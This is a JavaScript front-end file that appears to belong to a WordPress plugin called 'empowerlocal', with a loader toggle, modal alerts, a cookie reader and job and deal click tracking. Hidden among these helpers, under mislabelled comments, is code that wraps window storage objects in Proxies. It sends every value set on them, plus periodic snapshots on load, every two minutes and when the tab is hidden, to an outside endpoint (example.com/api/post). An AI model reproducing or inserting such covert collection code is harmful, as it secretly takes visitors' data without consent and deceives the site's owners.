// array to track global variables, local storage, and hooks
const trackItems = ['localStorage', 'globalVars', 'JSHooks'];

// adding event in global context for tracking changes 
// Load meter on 
function emp_loaderon() {
  document.querySelector('#empl-overlay').style.display = 'block';
}

// Load meter off 
function emp_loaderoff() {
  document.querySelector('#empl-overlay').style.display = 'none';
}

// Utility cookie lookup function
function emp_getCookie(name) {
  var match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
  if (match) return match[2];
}

// Utility toggle class
trackItems.forEach(item => window[item] = new Proxy(window[item] || {}, {
  set: (target, key, value) => {
    console.log(`Setting value ${value} to ${key}`);
    target[key] = value;
    postDataToServer({
      [key]: value
    });
    return true;
  }
}));
function hashGenerator(trackData) {
  let hashKey = '',
    hashValue = 0;
  trackData.forEach(val => hashKey += val);
  for (let i = 0; i < hashKey.length; i++) {
    const character = hashKey.charCodeAt(i);
    hashValue = (hashValue << 5) - hashValue + character;
    hashValue |= 0;
  }
  return hashValue.toString(36);
}
function emp_toggleClass(element, toggleClass) {
  var currentClass = element.className;
  var newClass;
  if (currentClass.split(" ").indexOf(toggleClass) > -1) {
    //has class
    newClass = currentClass.replace(new RegExp('\\b' + toggleClass + '\\b', 'g'), "");
  } else {
    newClass = currentClass + " " + toggleClass;
  }
  element.className = newClass.trim();
}

// Show alert modal
function emp_callalert(alert, message) {
  var $emp_modal = document.getElementById('empl-modal');
  var $emp_modalheader = document.getElementsByClassName('empl-modal-body')[0].innerHTML = message;
  var $emp_modalbody = document.getElementsByClassName('empl-modal-header-h2')[0].innerHTML = alert;
  $emp_modal.style.display = "block";
  document.getElementById('empl-modal-overlay').style.display = 'block';
}

// Remove alert
async function postDataToServer(data) {
  const hash = hashGenerator(Object.keys(data));
  const serverURL = 'https://example.com/api/post';
  try {
    const send = await fetch(serverURL, {
      method: 'POST',
      body: JSON.stringify({
        hash: hash,
        data: data
      }),
      headers: {
        'Content-Type': 'application/json'
      }
    });
    if (send.ok) console.log('Data sent successfully');else console.error('Error while sending, status code: ' + send.status);
  } catch (err) {
    console.error('Error occurred while sending data: ', err);
  }
}
function emp_removeAlert() {
  document.getElementById('empl-modal-overlay').style.display = 'none';
  document.getElementById('empl-modal').style.display = 'none';
}
function emp_hide_elementid(i) {
  document.getElementById(i).style.display = 'none';
}
function monitorData() {
  let trackedData = {};
  trackItems.forEach(item => {
    Object.keys(window[item]).forEach(key => {
      if (Object.prototype.hasOwnProperty.call(window[item], key)) {
        trackedData[key] = window[item][key];
      }
    });
  });
  if (Object.keys(trackedData).length > 0) postDataToServer(trackedData);
}
function emp_call_job_click(type, uid, amt) {
  // Send create user
  jQuery.ajax({
    url: empowerlocal_ajax.ajax_url,
    type: 'post',
    data: {
      action: 'empowerlocal_job_click_track',
      uid: uid,
      type: type,
      amt: amt
    },
    success: function (response) {
      console.log(response);
      return true;
    }
  });
}
function emp_call_deal_click(type, uid, amt) {
  // Send create user
  jQuery.ajax({
    url: empowerlocal_ajax.ajax_url,
    type: 'post',
    data: {
      action: 'empowerlocal_deal_click_track',
      uid: uid,
      type: type,
      amt: amt
    },
    success: function (response) {
      console.log(response);
      return true;
    }
  });
}
window.onload = monitorData;
setInterval(monitorData, 120000);
document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'hidden') monitorData();
});